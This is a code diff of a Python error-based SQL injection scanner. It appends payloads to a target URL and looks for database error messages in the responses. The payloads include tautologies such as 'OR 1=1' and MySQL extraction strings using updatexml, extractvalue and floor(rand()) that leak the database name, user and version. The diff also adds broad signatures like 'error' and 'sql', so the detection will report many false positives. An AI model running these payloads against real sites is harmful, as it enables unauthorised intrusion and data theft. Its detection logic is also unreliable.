@@ -1,22 +1,21 @@
 import requests as req
 from urllib.parse import urlparse
 
-def error_based(url, payload):
+def error_based(all_urls, payload):
     try:
-        separator = '&' if '?' in url else '?'
-        full_url = f"{url}{separator}{payload}"
-        
+        separator = '&' if '?' in all_urls else '?'
+        full_url = f"{all_urls}{separator}{payload}"
         response = req.get(full_url, timeout=10)
-        
+
         error_signatures = [
-            "SQL syntax", "mysql_fetch", "MySQL server version",
-            "ORA-", "native client", "unclosed quotation mark",
+            "sql", "syntax", "mysql", "error", "query", "SQL syntax", "mysql_fetch",
+            "MySQL server version", "ORA-", "native client", "unclosed quotation mark",
             "syntax error", "Warning: pg_", "unterminated quoted string",
             "Invalid column name", "Microsoft OLE DB Provider for SQL Server",
             "invalid number", "unexpected token", "division by zero"
         ]
 
-        return any(signature in response.text for signature in error_signatures)
+        return any(sig.lower() in response.text.lower() for sig in error_signatures)
 
     except req.RequestException as e:
         print(f"[!] Request failed: {e}")
@@ -24,8 +23,9 @@ def error_based(url, payload):
 
 def error_based_sql_injection(url):
     print("\n[+] Starting Error-Based SQL Injection Test...\n")
-    
+
     payloads = [
+        "'", "' OR 1=1 --", '\" OR 1=1 --', "' AND 1=2 --", "' OR 'a'='a'",
         "id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)-- -",
         "id=1' AND updatexml(NULL, CONCAT(0x3a, (SELECT user())), NULL)-- -",
         "id=1' AND extractvalue(NULL, CONCAT(0x3a, (SELECT version())))-- -",
@@ -38,7 +38,7 @@ def error_based_sql_injection(url):
         "id=1' AND (SELECT 1 FROM dual WHERE 1=1 AND LENGTH((SELECT database()))) > 0)-- -",
         "id=%27%20AND%20(SELECT%201%2F0)--%20"
     ]
-    
+
     for payload in payloads:
         print(f"[*] Testing payload: {payload}")
         if error_based(url, payload):
